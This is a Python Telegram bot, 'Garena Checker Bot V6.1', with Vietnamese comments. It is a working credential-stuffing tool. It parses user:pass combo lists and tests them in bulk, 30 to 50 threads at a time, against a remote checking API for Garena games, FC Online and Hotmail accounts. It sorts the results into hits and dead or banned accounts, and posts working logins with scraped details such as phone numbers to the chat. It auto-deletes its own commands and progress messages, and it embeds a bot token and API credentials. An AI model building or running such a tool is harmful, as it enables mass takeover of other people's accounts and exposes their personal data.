# ========================================================================
#    GARENA CHECKER BOT V6.1 - FULL FIX AUTO DELETE + HIT COMPACT
# ========================================================================
#    - Tu dong loc acc bi BAN (khong hien thi)
#    - Tu dong xoa tin nhan lenh sau khi dung
#    - Tu dong xoa tin nhan tien do va batch
#    - Chi hien thi HIT (acc sach) va DEAD (acc chet)
#    - Khong hien thi acc bi BAN
#    - Tra ket qua HIT co dong khung + loi dan
#    - An truong rong/NO/0
# ========================================================================

import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import struct
import math
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== FILE LUU THONG KE ==========
STATS_FILE = "check_stats.json"

def load_stats():
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {"total_checked": 0, "total_hits": 0, "total_dead": 0, "total_errors": 0, "total_banned": 0, "last_check": None, "history": []}

def save_stats(stats_data):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def update_stats(hit_count=0, dead_count=0, error_count=0, banned_count=0, accounts=None):
    stats_data = load_stats()
    stats_data["total_checked"] += hit_count + dead_count + error_count + banned_count
    stats_data["total_hits"] += hit_count
    stats_data["total_dead"] += dead_count
    stats_data["total_errors"] += error_count
    stats_data["total_banned"] += banned_count
    stats_data["last_check"] = datetime.now().isoformat()
    
    if accounts:
        stats_data["history"].append({
            "time": datetime.now().isoformat(),
            "total": len(accounts),
            "hits": hit_count,
            "dead": dead_count,
            "errors": error_count,
            "banned": banned_count
        })
        if len(stats_data["history"]) > 50:
            stats_data["history"] = stats_data["history"][-50:]
    
    save_stats(stats_data)
    return stats_data

# ========== CAU HINH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.3

CHECKMULTI_THREADS = 30
CHECKMULTI_DELAY = 0.5
CHECKMULTI_BATCH_SIZE = 10
CHECKMULTI_BATCH_DELAY = 3.0

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"
OUTPUT_LOC = "loc_accounts.txt"

MAX_MESSAGE_LENGTH = 4000

SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan Mobile",
        "icon": "🎮",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧",
        "params": ["tk", "mk"],
        "extra_params": {"keyword": ""}
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack (Tat ca)",
        "icon": "📦",
        "params": ["tk", "mk"],
        "extra_params": {}
    }
}

checking = False
stop_event = threading.Event()
pending_accounts = {}
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
cache_results = {}
cache_lock = threading.Lock()

rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

last_progress_msg = None
last_batch_msg = None
last_command_msg = None

def rate_limit(delay=DEFAULT_DELAY):
    global last_request_time
    with rate_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < delay:
            sleep_time = delay - time_since_last
            time.sleep(sleep_time)
        last_request_time = time.time()

def fix_encoding(text):
    if not isinstance(text, str):
        return text
    replacements = {
        'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
        'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
        'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
        'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
        'á»·': 'ỷ', 'á»µ': 'ỵ'
    }
    for old, new in replacements.items():
        text = text.replace(old, new)
    return text

def is_user_member(user_id):
    try:
        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        status = chat_member.status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

def check_membership(message):
    user_id = message.from_user.id
    if is_user_member(user_id):
        return True
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton(
        text="📢 THAM GIA KENH BAT BUOC",
        url=REQUIRED_CHANNEL_URL
    )
    check_button = telebot.types.InlineKeyboardButton(
        text="✅ TOI DA THAM GIA",
        callback_data="check_join"
    )
    markup.add(join_button)
    markup.add(check_button)
    bot.send_message(
        message.chat.id,
        f"🔒 BAN CHUA THAM GIA KENH BAT BUOC!\n\n📢 Vui long tham gia: {REQUIRED_CHANNEL}",
        reply_markup=markup
    )
    return False

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    if is_user_member(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Xac nhan thanh cong!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ XAC NHAN THANH CONG!\nDung /start de xem huong dan.")
    else:
        bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)

def delete_later(chat_id, message_id, delay=5):
    """Xoa tin nhan sau delay giay"""
    time.sleep(delay)
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

def safe_send_message(chat_id, text, parse_mode="HTML", auto_delete=False, delete_after=10):
    if not text:
        return None
    text = fix_encoding(text)
    try:
        msg = bot.send_message(chat_id, text, parse_mode=parse_mode)
        if auto_delete:
            threading.Thread(target=delete_later, args=(chat_id, msg.message_id, delete_after), daemon=True).start()
        return msg
    except:
        try:
            msg = bot.send_message(chat_id, text)
            if auto_delete:
                threading.Thread(target=delete_later, args=(chat_id, msg.message_id, delete_after), daemon=True).start()
            return msg
        except:
            return None

def safe_delete_message(chat_id, message_id):
    if not message_id:
        return
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

def is_valid_account(user, pwd):
    if len(user) < 2 or len(pwd) < 1:
        return False
    if len(user) > 80 or len(pwd) > 100:
        return False
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
        return False
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
        return False
    return True

def loc_tk_mk_only(content):
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    if not content:
        return accounts, stats_loc
    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
            continue
        matches = re.findall(pattern_colon, line)
        if matches:
            for user, pwd in matches:
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
            continue
        matches = re.findall(pattern_pipe, line)
        if matches:
            for user, pwd in matches:
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    return accounts, stats_loc

def save_loc_file(accounts):
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

def should_skip_field(value):
    """Kiem tra xem co nen an truong nay khong"""
    if value is None:
        return True
    if isinstance(value, str):
        value_lower = value.lower().strip()
        if value_lower in ["", "no", "none", "null", "n/a", "chưa xác thực", "chua xac thuc", "0", "0.0", "false"]:
            return True
        if any(word in value_lower for word in ["chưa", "chua", "no", "none", "null"]):
            if "email" in value_lower or "pass" in value_lower or "cccd" in value_lower or "authen" in value_lower:
                return True
        return False
    if isinstance(value, (int, float)):
        if value == 0:
            return False
    if isinstance(value, bool):
        if value is False:
            return True
    return False

def check_account_api(username, password, service, use_delay=True):
    if use_delay:
        rate_limit(DEFAULT_DELAY)
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    service_info = SERVICE_ROUTES.get(service, {})
    route = service_info.get("route", "/api/lienquan")
    param_names = service_info.get("params", ["tk", "mk"])
    url = f"{API_BASE}{route}"
    params = {"username": API_USERNAME, "password": API_PASSWORD}
    if len(param_names) >= 2:
        params[param_names[0]] = username
        params[param_names[1]] = password
    else:
        params["tk"] = username
        params["mk"] = password
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            if resp.status_code == 200:
                try:
                    result_data = resp.json()
                    if isinstance(result_data, dict):
                        for key, value in result_data.items():
                            if isinstance(value, str):
                                result_data[key] = fix_encoding(value)
                        is_hit = False
                        is_banned = False
                        banned_fields = ["banned", "ban", "aov_banned"]
                        for field in banned_fields:
                            if field in result_data:
                                val = result_data[field]
                                if isinstance(val, bool) and val:
                                    is_banned = True
                                    break
                                elif isinstance(val, str) and val.upper() in ["YES", "TRUE", "BANNED", "BAN"]:
                                    is_banned = True
                                    break
                        if is_banned:
                            result_data["result"] = "banned"
                            result_data["_is_banned"] = True
                            with cache_lock:
                                cache_results[cache_key] = result_data
                            return result_data
                        status_val = result_data.get("status")
                        if status_val is not None:
                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
                                is_hit = True
                        success_val = result_data.get("success")
                        if not is_hit and success_val is not None:
                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                is_hit = True
                        result_val = result_data.get("result")
                        if result_val is not None:
                            result_str = str(result_val).lower()
                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                is_hit = True
                        data_val = result_data.get("data")
                        if data_val is not None:
                            if isinstance(data_val, (dict, list, str)) and data_val:
                                is_hit = True
                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt", "shells", "aov_name", "aov_rank", "aov_level", "aov_total_skins", "aov_total_champs", "fc_name", "fc_ovr", "garena_created", "last_login", "region", "aov_ss", "aov_sss", "aov_anime"]
                        for field in info_fields:
                            if field in result_data and result_data[field] is not None and result_data[field] != "":
                                is_hit = True
                                break
                        result_data["result"] = "hit" if is_hit else "dead"
                        result_data["_is_banned"] = False
                        with cache_lock:
                            cache_results[cache_key] = result_data
                        return result_data
                except:
                    pass
            elif resp.status_code == 429:
                time.sleep(5)
                continue
            else:
                time.sleep(2)
        except:
            time.sleep(3)
    result = {"result": "error", "_error": "All retries failed"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

def format_full_info_compact(username, password, service, result_data):
    """Format FULL INFO cho HIT - co dong khung va loi dan"""
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
    
    if isinstance(result_data, dict):
        sections = {
            "📌 THONG TIN CO BAN": [
                ("UID", "uid"),
                ("Region", "region"),
                ("Shells", "shells"),
                ("Nap so", "nap_so"),
            ],
            "📱 BAO MAT": [
                ("SĐT", "sdt"),
                ("FB", "fb"),
            ],
            "🎮 LIEN QUAN": [
                ("Name", "aov_name"),
                ("Rank", "aov_rank"),
                ("Level", "aov_level"),
                ("Total Skins", "aov_total_skins"),
                ("Total Champs", "aov_total_champs"),
                ("QH", "aov_qh"),
            ],
            "📅 THONG TIN KHAC": [
                ("Login cuoi", "last_login"),
                ("Tao GR", "garena_created"),
                ("Ngay tao TK", "ngay_tao_tk"),
                ("Tinh Trang", "tinh_trang"),
            ]
        }
        
        info_lines = []
        
        for section_name, fields in sections.items():
            section_items = []
            for label, field in fields:
                if field in result_data:
                    value = result_data[field]
                    if should_skip_field(value):
                        continue
                    if isinstance(value, bool):
                        value = "YES" if value else "NO"
                    if isinstance(value, str):
                        value = fix_encoding(value)
                    section_items.append(f"  {label}: {value}")
            if section_items:
                info_lines.append(f"\n{section_name}")
                info_lines.extend(section_items)
        
        list_fields = [
            ("✨ SS List", "aov_ss_list"),
            ("🔥 Anime List", "aov_anime_list"),
            ("🎲 Other List", "aov_other_list")
        ]
        
        for label, field in list_fields:
            if field in result_data and result_data[field]:
                value = result_data[field]
                if isinstance(value, list) and value:
                    value = [fix_encoding(str(item)) for item in value]
                    info_lines.append(f"\n{label}:")
                    for item in value[:30]:
                        info_lines.append(f"  • {item}")
                    if len(value) > 30:
                        info_lines.append(f"  ... va {len(value) - 30} item khac")
        
        fc_fields = {
            "── FC Mobile ──": [
                ("FC Name", "fc_name"),
                ("OVR", "fc_ovr"),
            ]
        }
        for section_name, fields in fc_fields.items():
            section_items = []
            for label, field in fields:
                if field in result_data:
                    value = result_data[field]
                    if should_skip_field(value):
                        continue
                    if isinstance(value, str):
                        value = fix_encoding(value)
                    section_items.append(f"  {label}: {value}")
            if section_items:
                info_lines.append(f"\n{section_name}")
                info_lines.extend(section_items)
        
        if info_lines:
            msg += "\n" + "\n".join(info_lines)
        
        msg += f"\n\n{line}"
    
    return msg

def format_dead_info(username, password, service):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "❌")
    return f"{icon} <b>DEAD - {service_desc}</b>\n🔑 <code>{username}:{password}</code>"

def format_error_info(username, password, service):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "⚠️")
    return f"{icon} <b>ERROR - {service_desc}</b>\n🔑 <code>{username}:{password}</code>"

def check_single(chat_id, username, password, service="lienquan", cmd_msg=None):
    # Xoa lenh sau khi dung
    if cmd_msg:
        threading.Thread(target=delete_later, args=(chat_id, cmd_msg.message_id, 2), daemon=True).start()
    
    result = check_account_api(username, password, service, use_delay=False)
    result_type = result.get("result", "unknown")
    is_banned = result.get("_is_banned", False)
    if is_banned or result_type == "banned":
        update_stats(banned_count=1)
        return
    if result_type == "hit":
        hit_msg = format_full_info_compact(username, password, service, result)
        safe_send_message(chat_id, hit_msg)
        update_stats(hit_count=1)
    elif result_type == "dead":
        safe_send_message(chat_id, format_dead_info(username, password, service))
        update_stats(dead_count=1)
    else:
        safe_send_message(chat_id, format_error_info(username, password, service))
        update_stats(error_count=1)

def check_batch(chat_id, accounts, service, cmd_msg=None):
    global checking, stats, last_progress_msg, last_batch_msg
    
    # Xoa lenh sau khi dung
    if cmd_msg:
        threading.Thread(target=delete_later, args=(chat_id, cmd_msg.message_id, 2), daemon=True).start()
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!", auto_delete=True, delete_after=5)
        return
    checking = True
    stop_event.clear()
    total = len(accounts)
    stats = {
        "total": total,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "banned": 0,
        "unknown": 0,
        "start_time": time.time()
    }
    batches = []
    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
        batch = accounts[i:i + CHECKMULTI_BATCH_SIZE]
        batches.append(batch)
    total_batches = len(batches)
    batch_num = 0
    all_results = []
    last_progress_msg = None
    last_batch_msg = None

    def process_single(user, pwd):
        if stop_event.is_set():
            return
        rate_limit(CHECKMULTI_DELAY)
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        is_banned = result.get("_is_banned", False)
        all_results.append({
            "user": user,
            "pwd": pwd,
            "status": result_type,
            "data": result,
            "banned": is_banned
        })
        with stats_lock:
            stats["checked"] += 1
            if is_banned or result_type == "banned":
                stats["banned"] += 1
                return
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    hit_msg = format_full_info_compact(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1

    for batch in batches:
        if stop_event.is_set():
            break
        batch_num += 1
        if last_batch_msg:
            safe_delete_message(chat_id, last_batch_msg.message_id)
            last_batch_msg = None
        last_batch_msg = safe_send_message(chat_id, f"📦 BATCH {batch_num}/{total_batches} - {len(batch)} acc...", auto_delete=True, delete_after=5)
        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
            futures = {executor.submit(process_single, user, pwd): (user, pwd) for user, pwd in batch}
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        elapsed = time.time() - stats["start_time"]
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats["checked"] / total) * 100
        if last_progress_msg:
            safe_delete_message(chat_id, last_progress_msg.message_id)
            last_progress_msg = None
        last_progress_msg = safe_send_message(chat_id, f"📊 {stats['checked']}/{total} ({percent:.1f}%) | ✅{stats['hits']} ❌{stats['dead']} 🚫{stats['banned']}", auto_delete=True, delete_after=5)
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    checking = False
    elapsed = time.time() - stats["start_time"]
    if last_progress_msg:
        safe_delete_message(chat_id, last_progress_msg.message_id)
        last_progress_msg = None
    if last_batch_msg:
        safe_delete_message(chat_id, last_batch_msg.message_id)
        last_batch_msg = None
    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], banned_count=stats["banned"], accounts=accounts)
    summary = f"✅ CHECK HOAN TAT!\n━━━━━━━━━━━━━━━━\n📊 Tong: {stats['total']}\n🎯 HIT: {stats['hits']}\n❌ DEAD: {stats['dead']}\n🚫 BANNED: {stats['banned']}\n⚠️ ERROR: {stats['errors']}\n⏱ {elapsed:.1f}s"
    hits_list = [r for r in all_results if r["status"] == "hit" and not r["banned"]]
    if hits_list:
        summary += f"\n📌 HIT LIST ({len(hits_list)}):\n"
        for r in hits_list[:30]:
            summary += f"✅ <code>{r['user']}:{r['pwd']}</code>\n"
        if len(hits_list) > 30:
            summary += f"... va {len(hits_list) - 30} hits khac"
    safe_send_message(chat_id, summary)

def check_all_services(chat_id, accounts, cmd_msg=None):
    global checking, last_progress_msg, last_batch_msg
    
    # Xoa lenh sau khi dung
    if cmd_msg:
        threading.Thread(target=delete_later, args=(chat_id, cmd_msg.message_id, 2), daemon=True).start()
    
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!", auto_delete=True, delete_after=5)
        return
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    checking = True
    stop_event.clear()
    total_accounts = len(accounts)
    total_services = len(SERVICE_ROUTES)
    stats_all = {
        "total": total_accounts * total_services,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "errors": 0,
        "banned": 0,
        "start_time": time.time()
    }
    all_results = []
    last_progress_msg = None
    last_batch_msg = None

    def process_all(user, pwd, service):
        if stop_event.is_set():
            return
        rate_limit(DEFAULT_DELAY)
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        is_banned = result.get("_is_banned", False)
        all_results.append({
            "user": user,
            "pwd": pwd,
            "service": service,
            "status": result_type,
            "banned": is_banned
        })
        with stats_lock:
            stats_all["checked"] += 1
            if is_banned or result_type == "banned":
                stats_all["banned"] += 1
                return
            if result_type == "hit":
                stats_all["hits"] += 1
                try:
                    hit_msg = format_full_info_compact(user, pwd, service, result)
                    safe_send_message(chat_id, hit_msg)
                except:
                    pass
            elif result_type == "dead":
                stats_all["dead"] += 1
            else:
                stats_all["errors"] += 1

    batches = []
    for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE):
        batch_accounts = accounts[i:i + CHECKMULTI_BATCH_SIZE]
        batches.append(batch_accounts)
    batch_num = 0
    total_batches = len(batches)
    for batch_accounts in batches:
        if stop_event.is_set():
            break
        batch_num += 1
        if last_batch_msg:
            safe_delete_message(chat_id, last_batch_msg.message_id)
            last_batch_msg = None
        last_batch_msg = safe_send_message(chat_id, f"📦 BATCH {batch_num}/{total_batches} - {len(batch_accounts)} acc x {total_services} services...", auto_delete=True, delete_after=5)
        all_tasks = [(user, pwd, service) for user, pwd in batch_accounts for service in SERVICE_ROUTES.keys()]
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
            futures = {executor.submit(process_all, user, pwd, service): (user, pwd, service) for user, pwd, service in all_tasks}
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        elapsed = time.time() - stats_all["start_time"]
        speed = stats_all["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats_all["checked"] / stats_all["total"]) * 100
        if last_progress_msg:
            safe_delete_message(chat_id, last_progress_msg.message_id)
            last_progress_msg = None
        last_progress_msg = safe_send_message(chat_id, f"📊 {stats_all['checked']}/{stats_all['total']} ({percent:.1f}%) | ✅{stats_all['hits']} ❌{stats_all['dead']} 🚫{stats_all['banned']}", auto_delete=True, delete_after=5)
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    if last_progress_msg:
        safe_delete_message(chat_id, last_progress_msg.message_id)
        last_progress_msg = None
    if last_batch_msg:
        safe_delete_message(chat_id, last_batch_msg.message_id)
        last_batch_msg = None
    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"], banned_count=stats_all["banned"], accounts=accounts)
    summary = f"✅ CHECK ALL HOAN TAT!\n━━━━━━━━━━━━━━━━\n🎯 HIT: {stats_all['hits']}\n❌ DEAD: {stats_all['dead']}\n🚫 BANNED: {stats_all['banned']}\n⚠️ ERRORS: {stats_all['errors']}\n⏱ {elapsed:.1f}s"
    hits_list = [r for r in all_results if r["status"] == "hit" and not r["banned"]]
    if hits_list:
        summary += f"\n📌 HIT LIST ({len(hits_list)}):\n"
        for r in hits_list[:30]:
            summary += f"✅ {r['user']}:{r['pwd']} ({r['service']})\n"
        if len(hits_list) > 30:
            summary += f"... va {len(hits_list) - 30} hits khac"
    safe_send_message(chat_id, summary)

# ========== LENH ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_membership(message):
        return
    msg = bot.send_message(message.chat.id, f"""🤖 GARENA CHECKER BOT V6.1 - HIT COMPACT
👤 Admin: @baohuyno1

📌 LENH:
/check user:pass - Check 1 acc
/checkmulti user1:pass1,user2:pass2 - Check nhieu
/checkall - Check tat ca service
/services - Danh sach service
/stats - Xem thong ke
/stop - Dung check

⚡ TINH NANG:
✅ Loc acc BAN - Khong hien thi
✅ Tu dong xoa tin nhan lenh + tien do
✅ HIT compact - an truong rong/NO/0
✅ Co dong khung + loi dan
✅ FULL INFO cho HIT""")
    # Xoa lenh start sau 5s
    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()

@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not check_membership(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        msg = safe_send_message(message.chat.id, "❌ /check user:pass", auto_delete=True, delete_after=5)
        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
        return
    account_str = parts[1]
    service = parts[2] if len(parts) > 2 else "lienquan"
    if service not in SERVICE_ROUTES:
        msg = safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}", auto_delete=True, delete_after=5)
        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
        return
    accounts, _ = loc_tk_mk_only(account_str.replace('|', ':'))
    if not accounts:
        msg = safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass", auto_delete=True, delete_after=5)
        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
        return
    user, pwd = accounts[0]
    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service, message), daemon=True).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    if not check_membership(message):
        return
    text = message.text.strip()
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    if not text:
        msg = safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2", auto_delete=True, delete_after=5)
        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
        return
    lines = text.split('\n')
    service = "lienquan"
    if lines:
        last_line = lines[-1].strip()
        last_word = last_line.split()[-1] if last_line.split() else ""
        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
            service = last_word
            lines = lines[:-1]
        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
            service = last_word
            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
    accounts_input = '\n'.join(lines).replace(',', '\n').replace('|', ':')
    accounts, _ = loc_tk_mk_only(accounts_input)
    if not accounts:
        msg = safe_send_message(message.chat.id, "❌ Khong tim thay acc!", auto_delete=True, delete_after=5)
        threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
        return
    msg = safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts...", auto_delete=True, delete_after=5)
    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()
    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service, message), daemon=True).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not check_membership(message):
        return
    global pending_accounts
    chat_id = message.chat.id
    threading.Thread(target=delete_later, args=(chat_id, message.message_id, 5), daemon=True).start()
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accounts = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        msg = safe_send_message(chat_id, f"📊 Check all {len(accounts)} accounts...", auto_delete=True, delete_after=5)
        threading.Thread(target=check_all_services, args=(chat_id, accounts, message), daemon=True).start()
    else:
        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!", auto_delete=True, delete_after=5)

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not check_membership(message):
        return
    msg = "📋 SERVICE:\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
    safe_send_message(message.chat.id, msg)
    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    if not check_membership(message):
        return
    stats_data = load_stats()
    msg = f"""📊 THONG KE TONG
━━━━━━━━━━━━━━━━━━━━━━
📦 Tong acc da check: {stats_data.get('total_checked', 0)}
✅ Tong hits: {stats_data.get('total_hits', 0)}
❌ Tong dead: {stats_data.get('total_dead', 0)}
🚫 Tong banned: {stats_data.get('total_banned', 0)}
⚠️ Tong errors: {stats_data.get('total_errors', 0)}
⏰ Lan check cuoi: {stats_data.get('last_check', 'Chua co')}"""
    safe_send_message(message.chat.id, msg)
    threading.Thread(target=delete_later, args=(message.chat.id, message.message_id, 5), daemon=True).start()

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not check_membership(message):
        return
    stop_event.set()
    global checking
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!", auto_delete=True, delete_after=5)
